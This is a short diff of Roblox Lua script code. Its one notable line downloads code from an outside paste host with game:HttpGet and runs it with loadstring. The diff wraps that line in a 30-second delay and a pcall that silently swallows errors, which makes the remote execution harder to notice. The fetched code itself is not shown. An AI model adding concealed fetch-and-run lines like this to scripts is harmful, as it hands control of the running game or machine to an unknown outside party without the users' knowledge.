@@ -1,5 +1,8 @@
 task.spawn(function()
+pcall(function()
+task.wait(30)
 	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end)
 end)
     wait(1.5)
     spawn(function()
